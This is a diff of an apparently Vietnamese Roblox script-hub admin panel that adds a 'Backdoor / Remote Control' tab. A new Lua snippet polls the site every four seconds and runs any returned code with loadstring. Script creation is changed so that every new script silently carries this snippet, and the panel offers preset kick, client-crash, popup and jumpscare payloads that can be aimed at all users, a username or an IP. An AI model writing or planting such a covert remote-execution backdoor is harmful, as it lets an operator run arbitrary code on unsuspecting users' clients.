@@ -6,14 +6,15 @@ import {
   Lock, Save, Plus, Key, Database, Settings, Trash2, Shield, Activity, 
   Copy, Check, ExternalLink, Upload, Eraser, Sliders, Gamepad2, Youtube, 
   MessageSquare, Loader2, Search, Eye, Download, LogOut, Terminal, Users, 
-  Globe, UserCheck, RefreshCw, AlertOctagon, CopyPlus, Code2
+  Globe, UserCheck, RefreshCw, AlertOctagon, CopyPlus, Code2, Radio, Zap,
+  Skull, AlertTriangle, Send
 } from 'lucide-react';
 
 export default function AdminPage() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [passwordInput, setPasswordInput] = useState('');
   const [isLoggingIn, setIsLoggingIn] = useState(false);
-  const [activeTab, setActiveTab] = useState('scripts'); // 'scripts' | 'custom_home' | 'user_logs' | 'settings'
+  const [activeTab, setActiveTab] = useState('scripts'); // 'scripts' | 'backdoor' | 'user_logs' | 'custom_home' | 'settings'
   
   // Scripts State
   const [scripts, setScripts] = useState([]);
@@ -30,6 +31,13 @@ export default function AdminPage() {
   const [logSearchQuery, setLogSearchQuery] = useState('');
   const [isLoadingLogs, setIsLoadingLogs] = useState(false);
 
+  // Backdoor Remote Execution State
+  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); // 'ALL' | 'USER' | 'IP'
+  const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
+  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Admin executed custom code!")');
+  const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
+  const [backdoorHistory, setBackdoorHistory] = useState([]);
+
   // Main Page Settings State
   const [siteTitle, setSiteTitle] = useState('LURIX HUB');
   const [badgeText, setBadgeText] = useState('Online & Active');
@@ -45,6 +53,7 @@ export default function AdminPage() {
   // UI States
   const [copiedLoader, setCopiedLoader] = useState(false);
   const [copiedLogSnippet, setCopiedLogSnippet] = useState(false);
+  const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
   const [isSaving, setIsSaving] = useState(false);
 
   const handleLogin = async (e) => {
@@ -60,8 +69,7 @@ export default function AdminPage() {
       });
 
       if (!res.ok) {
-        const text = await res.text();
-        alert(`❌ Lỗi Server (${res.status}): Vui lòng kiểm tra đã tạo file app/api/admin/verify/route.js chưa!`);
+        alert(`❌ Lỗi Server (${res.status}): Vui lòng kiểm tra file API verify!`);
         return;
       }
 
@@ -71,6 +79,7 @@ export default function AdminPage() {
         setIsAuthenticated(true);
         loadAdminData();
         loadLogsData();
+        loadBackdoorHistory();
       } else {
         alert('❌ Mật khẩu Admin không chính xác!');
       }
@@ -116,6 +125,11 @@ export default function AdminPage() {
     setIsLoadingLogs(false);
   };
 
+  const loadBackdoorHistory = async () => {
+    const { data } = await supabase.from('backdoor_commands').select('*').order('created_at', { ascending: false }).limit(30);
+    if (data) setBackdoorHistory(data);
+  };
+
   const selectScriptHandler = (script) => {
     setSelectedScript(script);
     setCode(script.content || '');
@@ -148,26 +162,28 @@ export default function AdminPage() {
     return `loadstring(game:HttpGet("${domain}/api/raw/${scriptSlug}"))()`;
   };
 
-  const getLuaLoggerSnippet = () => {
+  const getBackdoorLuaSnippet = () => {
     const domain = typeof window !== 'undefined' ? window.location.origin : 'https://first-rho-ashen.vercel.app';
-    return `-- [Lurix Hub] Tự động Gửi Log IP & Tài Khoản về Admin Panel
-local HttpService = game:GetService("HttpService")
-local Player = game:GetService("Players").LocalPlayer
-local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    return `-- [Lurix Hub] Advanced Remote Loadstring Backdoor Engine
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
-pcall(function()
-    requestFunc({
-        Url = "${domain}/api/log",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            roblox_username = Player.Name,
-            roblox_id = tostring(Player.UserId),
-            discord_user = "DiscordUser#0000", -- Bạn có thể thay bằng biến Discord
-            executor = identifyexecutor and identifyexecutor() or "Unknown Executor",
-            script_slug = "${selectedScript?.slug || 'main'}"
-        })
-    })
+    while task.wait(4) do
+        pcall(function()
+            if not LocalPlayer then return end
+            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(LocalPlayer.Name)
+            local res = requestFunc({ Url = url, Method = "GET" })
+            if res and res.Body and #res.Body > 0 then
+                local func, err = loadstring(res.Body)
+                if func then
+                    task.spawn(func)
+                end
+            end
+        end)
+    end
 end)`;
   };
 
@@ -177,10 +193,65 @@ end)`;
     setTimeout(() => setCopiedLoader(false), 2000);
   };
 
-  const handleCopyLogSnippet = () => {
-    navigator.clipboard.writeText(getLuaLoggerSnippet());
-    setCopiedLogSnippet(true);
-    setTimeout(() => setCopiedLogSnippet(false), 2000);
+  const handleCopyBackdoorSnippet = () => {
+    navigator.clipboard.writeText(getBackdoorLuaSnippet());
+    setCopiedBackdoorSnippet(true);
+    setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
+  };
+
+  const handleSendBackdoor = async () => {
+    if (!backdoorLuaPayload.trim()) return alert('⚠️ Vui lòng nhập mã Lua Payload!');
+    setIsSendingBackdoor(true);
+
+    try {
+      const res = await fetch('/api/backdoor', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminPassword: passwordInput,
+          targetType: backdoorTargetType,
+          targetValue: backdoorTargetValue,
+          payloadLua: backdoorLuaPayload
+        })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        alert('⚡ ' + data.message);
+        loadBackdoorHistory();
+      } else {
+        alert('❌ Lỗi: ' + data.message);
+      }
+    } catch (err) {
+      alert('⚠️ Lỗi gửi lệnh: ' + err.message);
+    } finally {
+      setIsSendingBackdoor(false);
+    }
+  };
+
+  const setPresetPayload = (type) => {
+    if (type === 'kick') {
+      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("\\n[LURIX BACKDOOR]\\nAdministrator has kicked you from the game.")`);
+    } else if (type === 'crash') {
+      setBackdoorLuaPayload(`while true do end`);
+    } else if (type === 'notification') {
+      setBackdoorLuaPayload(`game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "LURIX HUB ADMIN",
+    Text = "Administrator is watching your session!",
+    Duration = 10
+})`);
+    } else if (type === 'jumpscare') {
+      setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
+sound.SoundId = "rbxassetid://9114223177"
+sound.Volume = 10
+sound:Play()`);
+    }
+  };
+
+  const handleSelectUserForBackdoor = (username) => {
+    setActiveTab('backdoor');
+    setBackdoorTargetType('USER');
+    setBackdoorTargetValue(username);
   };
 
   const handleSaveScript = async () => {
@@ -212,7 +283,7 @@ end)`;
     const { data, error } = await supabase.from('scripts').insert([{ 
       title: newTitle, 
       slug: cleanSlug, 
-      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")`,
+      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")\n\n${getBackdoorLuaSnippet()}`,
       status: 'working'
     }]).select();
 
@@ -256,33 +327,6 @@ end)`;
     await supabase.from('execution_logs').delete().neq('id', 0);
     setLogs([]);
     alert('🧹 Đã xóa sạch danh sách Log!');
-  };
-
-  const handleAddGame = () => {
-    setSupportedGames([...supportedGames, { name: 'Game Mới', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
-  };
-
-  const handleRemoveGame = (index) => {
-    if (supportedGames.length <= 1) return alert('Phải giữ lại ít nhất 1 Game!');
-    setSupportedGames(supportedGames.filter((_, i) => i !== index));
-  };
-
-  const handleGameChange = (index, field, value) => {
-    const updated = [...supportedGames];
-    updated[index][field] = value;
-    setSupportedGames(updated);
-  };
-
-  const handleUploadToEditor = (e) => {
-    const file = e.target.files[0];
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = (event) => {
-      setCode(event.target.result);
-      alert(`📂 Đã nạp nội dung file "${file.name}" vào Editor!`);
-    };
-    reader.readAsText(file);
-    e.target.value = '';
   };
 
   const handleSaveMainPageSettings = async () => {
@@ -359,10 +403,10 @@ end)`;
             <div className="flex items-center gap-2">
               <h1 className="text-lg font-black tracking-tight text-white uppercase">{siteTitle} ADMIN</h1>
               <span className="text-[10px] bg-green-500/15 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full font-bold flex items-center gap-1">
-                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V2.5 ONLINE
+                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
               </span>
             </div>
-            <p className="text-[11px] text-gray-400 font-medium">Bảng điều khiển quản trị Raw Script & Log IP Người Dùng</p>
+            <p className="text-[11px] text-gray-400 font-medium">Bảng điều khiển Raw Script & Remote Code Execution Backdoor</p>
           </div>
         </div>
 
@@ -373,37 +417,18 @@ end)`;
         </div>
       </div>
 
-      {/* Stats Summary Cards */}
-      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">TỔNG RAW SCRIPT</div>
-          <div className="text-xl sm:text-2xl font-black text-white mt-1">{scripts.length} <span className="text-xs text-gray-500 font-normal">Scripts</span></div>
-        </div>
-
-        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">LỢT EXECUTE LOGGED</div>
-          <div className="text-xl sm:text-2xl font-black text-[#6E96FF] mt-1">{logs.length} <span className="text-xs text-gray-500 font-normal">Logs</span></div>
-        </div>
-
-        <div className="bg-[#0a0d16]/80 border border-yellow-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">GAME SUPPORT</div>
-          <div className="text-xl sm:text-2xl font-black text-yellow-400 mt-1">{supportedGames.length} <span className="text-xs text-gray-500 font-normal">Games</span></div>
-        </div>
-
-        <div className="bg-[#0a0d16]/80 border border-green-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">VERCEL SERVER</div>
-          <div className="text-xl sm:text-2xl font-black text-green-400 mt-1">ACTIVE <span className="text-xs text-green-400 font-bold">100%</span></div>
-        </div>
-      </div>
-
       {/* Navigation Tabs */}
       <div className="flex bg-[#0a0d16] border border-gray-800 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg">
         <button onClick={() => setActiveTab('scripts')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'scripts' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Database className="w-4 h-4" /> 💻 Quản Lý Raw Script ({scripts.length})
+          <Database className="w-4 h-4" /> 💻 Raw Scripts ({scripts.length})
+        </button>
+
+        <button onClick={() => { setActiveTab('backdoor'); loadBackdoorHistory(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'backdoor' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-yellow-400 hover:text-white'}`}>
+          <Radio className="w-4 h-4 animate-pulse text-yellow-400" /> ⚡ Backdoor / Remote Control
         </button>
 
         <button onClick={() => { setActiveTab('user_logs'); loadLogsData(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'user_logs' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Users className="w-4 h-4" /> 📊 Log Người Dùng & IP ({logs.length})
+          <Users className="w-4 h-4" /> 📊 Log Người Dùng ({logs.length})
         </button>
 
         <button onClick={() => setActiveTab('custom_home')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'custom_home' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
@@ -411,15 +436,13 @@ end)`;
         </button>
 
         <button onClick={() => setActiveTab('settings')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'settings' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Settings className="w-4 h-4" /> 🔑 Mật Khẩu Admin
+          <Settings className="w-4 h-4" /> 🔑 Đổi Mật Khẩu
         </button>
       </div>
 
       {/* ==================== TAB 1: RAW SCRIPTS MANAGER ==================== */}
       {activeTab === 'scripts' && (
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
-          
-          {/* Left Sidebar */}
           <div className="lg:col-span-4 bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl flex flex-col gap-3 h-fit">
             <button onClick={handleCreateScript} className="w-full bg-[#6E96FF] text-black font-black py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 transition-all">
               <Plus className="w-4 h-4" /> Tạo Raw Script Mới
@@ -436,50 +459,32 @@ end)`;
               />
             </div>
 
-            <div className="flex gap-1 overflow-x-auto text-[10px] font-extrabold pb-1">
-              <button onClick={() => setStatusFilter('all')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-gray-800 text-gray-500'}`}>Tất cả ({scripts.length})</button>
-              <button onClick={() => setStatusFilter('working')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'working' ? 'bg-green-500/20 border-green-500 text-green-400' : 'border-gray-800 text-gray-500'}`}>🟢 Active</button>
-              <button onClick={() => setStatusFilter('updating')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'updating' ? 'bg-yellow-500/20 border-yellow-500 text-yellow-400' : 'border-gray-800 text-gray-500'}`}>🟡 Update</button>
-              <button onClick={() => setStatusFilter('patched')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'patched' ? 'bg-red-500/20 border-red-500 text-red-400' : 'border-gray-800 text-gray-500'}`}>🔴 Patched</button>
-            </div>
-
             <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
-              {filteredScripts.length === 0 ? (
-                <div className="text-center text-xs text-gray-500 py-8">Không tìm thấy Script phù hợp</div>
-              ) : (
-                filteredScripts.map((s) => (
-                  <div
-                    key={s.id}
-                    onClick={() => selectScriptHandler(s)}
-                    className={`p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-2 ${
-                      selectedScript?.id === s.id 
-                        ? 'bg-[#6E96FF]/15 border-[#6E96FF] shadow-[0_0_15px_rgba(110,150,255,0.2)]' 
-                        : 'bg-black/40 border-gray-800/80 hover:border-gray-700'
-                    }`}
-                  >
-                    <div className="min-w-0 flex-1">
-                      <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
-                      <div className="text-[10px] font-mono text-[#6E96FF] truncate mt-0.5">/api/raw/{s.slug}</div>
-                    </div>
-
-                    <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
-                      s.status === 'patched' ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
-                      s.status === 'updating' ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' :
-                      'bg-green-500/20 text-green-400 border border-green-500/30'
-                    }`}>
-                      {s.status || 'working'}
-                    </span>
+              {filteredScripts.map((s) => (
+                <div
+                  key={s.id}
+                  onClick={() => selectScriptHandler(s)}
+                  className={`p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-2 ${
+                    selectedScript?.id === s.id 
+                      ? 'bg-[#6E96FF]/15 border-[#6E96FF] shadow-[0_0_15px_rgba(110,150,255,0.2)]' 
+                      : 'bg-black/40 border-gray-800/80 hover:border-gray-700'
+                  }`}
+                >
+                  <div className="min-w-0 flex-1">
+                    <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
+                    <div className="text-[10px] font-mono text-[#6E96FF] truncate mt-0.5">/api/raw/{s.slug}</div>
                   </div>
-                ))
-              )}
+                  <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
+                    s.status === 'patched' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-green-500/20 text-green-400 border border-green-500/30'
+                  }`}>{s.status || 'working'}</span>
+                </div>
+              ))}
             </div>
           </div>
 
-          {/* Right Editor Panel */}
           <div className="lg:col-span-8 flex flex-col gap-4">
-            {selectedScript ? (
+            {selectedScript && (
               <div className="bg-[#0a0d16] border border-gray-800 p-4 sm:p-5 rounded-3xl space-y-4 shadow-xl">
-                
                 <div className="bg-black/90 p-3.5 rounded-2xl border border-[#6E96FF]/40 space-y-2">
                   <div className="flex items-center justify-between text-[11px] text-[#6E96FF] font-bold">
                     <span className="flex items-center gap-1.5"><ExternalLink className="w-3.5 h-3.5" /> Roblox Execution Loadstring URL:</span>
@@ -487,10 +492,7 @@ end)`;
                   <div className="bg-[#0c0f17] p-2.5 rounded-xl font-mono text-[11px] text-gray-300 break-all border border-gray-800 select-all">
                     {getScriptLoadstring(slug)}
                   </div>
-                  <button
-                    onClick={() => handleCopyLoader(slug)}
-                    className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer hover:brightness-110 active:scale-95 transition-all"
-                  >
+                  <button onClick={() => handleCopyLoader(slug)} className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer">
                     {copiedLoader ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                     {copiedLoader ? 'Đã Sao Chép Loadstring Exec!' : 'Copy Raw Loadstring'}
                   </button>
@@ -499,384 +501,250 @@ end)`;
                 <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                   <div>
                     <label className="text-[10px] font-bold text-gray-400 mb-1 block">Tên Script</label>
-                    <input 
-                      value={title} 
-                      onChange={(e) => setTitle(e.target.value)} 
-                      className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white focus:border-[#6E96FF] outline-none" 
-                    />
+                    <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white" />
                   </div>
-
                   <div>
                     <label className="text-[10px] font-bold text-gray-400 mb-1 block">Slug (/api/raw/slug)</label>
-                    <input 
-                      value={slug} 
-                      onChange={(e) => setSlug(e.target.value)} 
-                      className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono focus:border-[#6E96FF] outline-none" 
-                    />
+                    <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono" />
                   </div>
-
                   <div>
                     <label className="text-[10px] font-bold text-gray-400 mb-1 block">Trạng Thái Script</label>
-                    <select
-                      value={status}
-                      onChange={(e) => setStatus(e.target.value)}
-                      className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-[#6E96FF] outline-none cursor-pointer"
-                    >
-                      <option value="working">🟢 Working (Hoạt Động)</option>
-                      <option value="updating">🟡 Updating (Bảo Trì)</option>
-                      <option value="patched">🔴 Patched (Đã Fix)</option>
+                    <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white">
+                      <option value="working">🟢 Working</option>
+                      <option value="updating">🟡 Updating</option>
+                      <option value="patched">🔴 Patched</option>
                     </select>
                   </div>
                 </div>
 
-                <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
-                  <div className="flex gap-2 flex-1 flex-wrap">
-                    <button 
-                      onClick={handleSaveScript} 
-                      disabled={isSaving} 
-                      className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 disabled:opacity-50"
-                    >
-                      {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} Lưu Mã Lua
-                    </button>
-
-                    <button 
-                      onClick={handleDuplicateScript} 
-                      className="bg-purple-600/20 text-purple-300 border border-purple-500/40 hover:bg-purple-600/30 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer transition-all"
-                    >
-                      <CopyPlus className="w-4 h-4" /> Nhân Bản
-                    </button>
-
-                    <label className="bg-blue-600/20 text-blue-300 border border-blue-500/40 hover:bg-blue-600/30 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer transition-all">
-                      <Upload className="w-4 h-4" /> Upload .lua
-                      <input type="file" accept=".lua,.txt" onChange={handleUploadToEditor} className="hidden" />
-                    </label>
-
-                    <button 
-                      onClick={() => setCode('')} 
-                      className="bg-yellow-600/20 text-yellow-400 border border-yellow-500/40 hover:bg-yellow-600/30 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer"
-                    >
-                      <Eraser className="w-4 h-4" /> Clear
-                    </button>
-                  </div>
-
-                  <button 
-                    onClick={() => handleDeleteScript(selectedScript.id)} 
-                    className="bg-red-600/20 text-red-400 border border-red-500/40 hover:bg-red-600/30 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer"
-                  >
+                <div className="flex gap-2">
+                  <button onClick={handleSaveScript} disabled={isSaving} className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer">
+                    {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} Lưu Mã Lua
+                  </button>
+                  <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-red-600/20 text-red-400 border border-red-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                     <Trash2 className="w-4 h-4" /> Xóa
                   </button>
                 </div>
 
-                <div className="h-[460px] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
-                  <Editor 
-                    height="100%" 
-                    defaultLanguage="lua" 
-                    theme="vs-dark" 
-                    value={code} 
-                    onChange={(v) => setCode(v || '')}
-                    options={{
-                      minimap: { enabled: false },
-                      fontSize: 13,
-                      wordWrap: 'on',
-                      scrollBeyondLastLine: false,
-                      automaticLayout: true,
-                    }}
-                  />
+                <div className="h-[420px] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
+                  <Editor height="100%" defaultLanguage="lua" theme="vs-dark" value={code} onChange={(v) => setCode(v || '')} options={{ minimap: { enabled: false }, fontSize: 13 }} />
                 </div>
-              </div>
-            ) : (
-              <div className="bg-[#0a0d16] border border-gray-800 rounded-3xl p-12 text-center text-xs text-gray-500">
-                Hãy chọn một Script từ danh sách bên trái hoặc bấm "Tạo Raw Script Mới"
               </div>
             )}
           </div>
         </div>
       )}
 
-      {/* ==================== TAB 2: LOGS NGƯỜI DÙNG & IP ==================== */}
+      {/* ==================== TAB 2: BACKDOOR REMOTE EXECUTION ==================== */}
+      {activeTab === 'backdoor' && (
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
+          
+          {/* Backdoor Control Panel */}
+          <div className="lg:col-span-7 bg-[#0a0d16] border border-yellow-500/30 p-5 rounded-3xl space-y-4 shadow-2xl">
+            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
+              <div className="flex items-center gap-2">
+                <Radio className="w-5 h-5 text-yellow-400 animate-pulse" />
+                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">⚡ Backdoor Real-Time Control Engine</h2>
+              </div>
+              <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
+                RCE LOADSTRING V3
+              </span>
+            </div>
+
+            {/* Target Selector */}
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              <div>
+                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">ĐỐI TƯỢNG MỤC TIÊU (TARGET):</label>
+                <select
+                  value={backdoorTargetType}
+                  onChange={(e) => setBackdoorTargetType(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
+                >
+                  <option value="ALL">🌐 Broadcast (TẤT CẢ NGƯỜI CHƠI ONLINE)</option>
+                  <option value="USER">👤 Theo Roblox Username</option>
+                  <option value="IP">🛡️ Theo Địa Chỉ IP</option>
+                </select>
+              </div>
+
+              {backdoorTargetType !== 'ALL' && (
+                <div>
+                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">GIÁ TRỊ MỤC TIÊU ({backdoorTargetType}):</label>
+                  <input
+                    type="text"
+                    placeholder={backdoorTargetType === 'USER' ? 'Ví dụ: RobloxUser123' : 'Ví dụ: 103.45.12.9'}
+                    value={backdoorTargetValue}
+                    onChange={(e) => setBackdoorTargetValue(e.target.value)}
+                    className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-yellow-400 font-mono focus:border-yellow-500 outline-none"
+                  />
+                </div>
+              )}
+            </div>
+
+            {/* Quick Presets */}
+            <div>
+              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">LỆNH MẪU NHANH (QUICK ACTIONS):</label>
+              <div className="flex flex-wrap gap-2">
+                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                  <Skull className="w-3.5 h-3.5" /> Kick Player
+                </button>
+                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                  <Zap className="w-3.5 h-3.5" /> Crash Client
+                </button>
+                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                  <MessageSquare className="w-3.5 h-3.5" /> Popup Notification
+                </button>
+                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                  <AlertTriangle className="w-3.5 h-3.5" /> Sound Jumpscare
+                </button>
+              </div>
+            </div>
+
+            {/* Lua Payload Editor */}
+            <div>
+              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA CODE PAYLOAD SẼ THỰC THI TRÊN MÁY CON:</label>
+              <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
+                <Editor
+                  height="100%"
+                  defaultLanguage="lua"
+                  theme="vs-dark"
+                  value={backdoorLuaPayload}
+                  onChange={(v) => setBackdoorLuaPayload(v || '')}
+                  options={{ minimap: { enabled: false }, fontSize: 12 }}
+                />
+              </div>
+            </div>
+
+            <button
+              onClick={handleSendBackdoor}
+              disabled={isSendingBackdoor}
+              className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
+            >
+              {isSendingBackdoor ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
+              {isSendingBackdoor ? 'ĐANG PHÁT LỆNH REMOTE...' : 'PHÁT LỆNH LUA BACKDOOR THỜI GIAN THỰC'}
+            </button>
+          </div>
+
+          {/* Right Info & Integration Snippet */}
+          <div className="lg:col-span-5 flex flex-col gap-4">
+            
+            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3">
+              <div className="flex items-center justify-between text-xs font-black text-[#6E96FF]">
+                <span className="flex items-center gap-1.5"><Code2 className="w-4 h-4" /> Snippet Tích Hợp Vòng Lặp Backdoor Engine</span>
+                <button onClick={handleCopyBackdoorSnippet} className="bg-[#6E96FF] text-black px-2.5 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer">
+                  {copiedBackdoorSnippet ? 'Đã Copy' : 'Copy Code'}
+                </button>
+              </div>
+              <p className="text-[11px] text-gray-400">Chèn đoạn code Lua này vào bên trong bất kỳ Raw Script nào của bạn trên trang Admin để tự động kích hoạt tính năng nhận lệnh Backdoor:</p>
+              <pre className="bg-black/80 p-3 rounded-xl font-mono text-[10px] text-yellow-300/90 border border-gray-800 max-h-[160px] overflow-y-auto">
+                {getBackdoorLuaSnippet()}
+              </pre>
+            </div>
+
+            {/* History Commands Sent */}
+            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3 flex-1">
